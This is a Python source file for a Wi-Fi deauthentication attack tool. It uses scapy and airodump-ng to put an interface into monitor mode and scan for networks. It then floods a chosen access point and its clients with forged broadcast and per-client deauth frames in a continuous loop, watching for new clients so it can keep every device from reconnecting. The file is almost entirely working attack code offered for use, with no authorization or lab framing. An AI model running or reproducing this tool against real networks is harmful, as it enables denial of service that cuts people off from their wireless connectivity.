#!/usr/bin/env python3

from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from rich.console import Console
from rich.progress import Progress
import threading
import time
import os
import subprocess
from modules.utils import (
    get_interface,
    setup_monitor_mode,
    scan_networks,
    select_target,
    get_data_path,
    log_activity,
    get_temp_path,
    cleanup_temp_files
)

class DeauthAttacker:
    def __init__(self):
        self.console = Console()
        self.interface = None
        self.target_bssid = None
        self.target_essid = None
        self.target_channel = None
        self.target_client = None
        self.running = False
        self.packets_sent = 0
        self.start_time = None
        self.status_thread = None
        self.clients = set()

    def send_deauth_packets(self):
        """Send deauthentication packets with improved reliability and continuous blocking"""
        try:
            # Create broadcast deauth packet (affects all clients)
            broadcast_packet = RadioTap()/Dot11(
                addr1="ff:ff:ff:ff:ff:ff",  # Broadcast to all clients
                addr2=self.target_bssid,    # Source: Target AP
                addr3=self.target_bssid     # BSSID
            )/Dot11Deauth(reason=7)  # Reason 7: Class 3 frame received from nonassociated STA

            # Create deauth packet for specific clients
            def create_client_packets(client_mac):
                # From AP to client
                pkt1 = RadioTap()/Dot11(
                    addr1=client_mac,
                    addr2=self.target_bssid,
                    addr3=self.target_bssid
                )/Dot11Deauth(reason=7)
                
                # From client to AP
                pkt2 = RadioTap()/Dot11(
                    addr1=self.target_bssid,
                    addr2=client_mac,
                    addr3=self.target_bssid
                )/Dot11Deauth(reason=7)
                
                return [pkt1, pkt2]

            while self.running:
                try:
                    # Send broadcast deauth to prevent any new connections
                    for _ in range(5):  # Send multiple times for reliability
                        sendp(broadcast_packet, iface=self.interface, verbose=False)
                        self.packets_sent += 1
                    
                    # If specific clients are known, target them directly
                    current_clients = set(self.clients)  # Make a copy to avoid modification during iteration
                    for client in current_clients:
                        if not self.running:
                            break
                        client_packets = create_client_packets(client)
                        for packet in client_packets:
                            sendp(packet, iface=self.interface, verbose=False)
                            self.packets_sent += 1
                    
                    # Brief pause to prevent overwhelming the interface
                    time.sleep(0.001)  # 1ms delay between cycles
                    
                except Exception as e:
                    self.console.print(f"[red]Error sending packet: {str(e)}[/red]")
                    time.sleep(0.1)  # Wait before retrying

        except Exception as e:
            self.console.print(f"[red]Error in deauth process: {str(e)}[/red]")

    def monitor_clients(self):
        """Monitor for new clients and add them to the deauth list"""
        while self.running:
            try:
                # Use airodump-ng to monitor for clients
                temp_file = get_temp_path(f'clients_{self.target_bssid.replace(":", "")}')
                monitor_cmd = [
                    'airodump-ng',
                    '--bssid', self.target_bssid,
                    '--channel', self.target_channel,
                    '--write', temp_file,
                    '--output-format', 'csv',
                    self.interface
                ]
                
                process = subprocess.Popen(
                    monitor_cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                
                try:
                    while self.running:
                        csv_file = f"{temp_file}-01.csv"
                        if os.path.exists(csv_file):
                            with open(csv_file, 'r') as f:
                                lines = f.readlines()
                                
                            # Find client section
                            for i, line in enumerate(lines):
                                if 'Station MAC' in line:
                                    # Process all lines after this as clients
                                    for client_line in lines[i+1:]:
                                        if ',' in client_line:
                                            parts = client_line.strip().split(',')
                                            if len(parts) >= 6 and parts[5].strip() == self.target_bssid:
                                                client_mac = parts[0].strip()
                                                if client_mac and ':' in client_mac:
                                                    self.clients.add(client_mac)
                                                    
                        time.sleep(1)  # Check for new clients every second
                        
                finally:
                    process.terminate()
                    # Cleanup temporary files
                    cleanup_temp_files()
                    
            except Exception as e:
                self.console.print(f"[red]Error monitoring clients: {str(e)}[/red]")
                time.sleep(1)

    def display_status(self):
        """Display attack status with improved metrics"""
        while self.running:
            try:
                elapsed = time.time() - self.start_time
                rate = self.packets_sent / elapsed if elapsed > 0 else 0
                
                self.console.clear()
                self.console.print("\n[bold cyan]Deauthentication Attack Status:[/bold cyan]")
                self.console.print(f"Target Network: {self.target_essid}")
                self.console.print(f"Target BSSID: {self.target_bssid}")
                if self.target_client:
                    self.console.print(f"Target Client: {self.target_client}")
                else:
                    self.console.print("Target: All Clients (Broadcast)")
                self.console.print(f"Channel: {self.target_channel}")
                self.console.print(f"Packets Sent: {self.packets_sent}")
                self.console.print(f"Duration: {int(elapsed)}s")
                self.console.print(f"Rate: {int(rate)} packets/s")
                self.console.print("\n[yellow]Press Ctrl+C to stop[/yellow]")
                
                time.sleep(1)
            except:
                break

    def select_client(self):
        """Select specific client to attack"""
        if not self.clients:
            self.console.print("[yellow]No clients connected to target network.[/yellow]")
            return None

        self.console.print("\n[cyan]Connected Clients:[/cyan]")
        for idx, client in enumerate(self.clients, 1):
            self.console.print(f"{idx}. {client}")
        
        self.console.print("0. Attack all clients (broadcast)")
        
        while True:
            try:
                choice = int(input("\nSelect target client number (0 for all): "))
                if choice == 0:
                    return None
                if 1 <= choice <= len(self.clients):
                    return self.clients[choice - 1]
            except ValueError:
                pass
            self.console.print("[red]Invalid choice. Please try again.[/red]")

    def start_attack(self):
        """Start deauthentication attack with improved client blocking"""
        try:
            # Get interface
            self.interface = get_interface()
            if not self.interface:
                return

            # Setup monitor mode
            self.interface = setup_monitor_mode(self.interface)
            if not self.interface:
                return

            # Scan for networks
            self.console.print("\n[cyan]Scanning for networks...[/cyan]")
            networks = scan_networks(self.interface)
            
            # Select target
            result = select_target(networks)
            if not result:
                return
                
            self.target_bssid, self.target_channel, self.target_essid, self.clients = result
            
            # Start attack
            self.console.print("\n[green]Starting aggressive deauthentication attack...[/green]")
            self.console.print("[yellow]All devices will be prevented from connecting[/yellow]")
            self.console.print("[yellow]Press Ctrl+C to stop[/yellow]\n")
            
            self.running = True
            self.start_time = time.time()
            
            # Start client monitoring thread
            monitor_thread = threading.Thread(target=self.monitor_clients)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            # Start status display thread
            self.status_thread = threading.Thread(target=self.display_status)
            self.status_thread.daemon = True
            self.status_thread.start()

            # Start sending deauth packets
            self.send_deauth_packets()

        except KeyboardInterrupt:
            self.console.print("\n[yellow]Attack stopped by user[/yellow]")
        except Exception as e:
            self.console.print(f"[red]Error during attack: {str(e)}[/red]")
        finally:
            self.running = False
            if self.status_thread and self.status_thread.is_alive():
                self.status_thread.join()
            
            # Log attack details
            log_file = get_data_path('deauth', f'deauth_{self.target_bssid.replace(":", "")}.log')
            with open(log_file, 'a') as f:
                f.write(f"Attack completed at: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Target Network: {self.target_essid}\n")
                f.write(f"Target BSSID: {self.target_bssid}\n")
                f.write(f"Total Packets Sent: {self.packets_sent}\n")
                f.write(f"Unique Clients Targeted: {len(self.clients)}\n")
                f.write("-" * 50 + "\n") 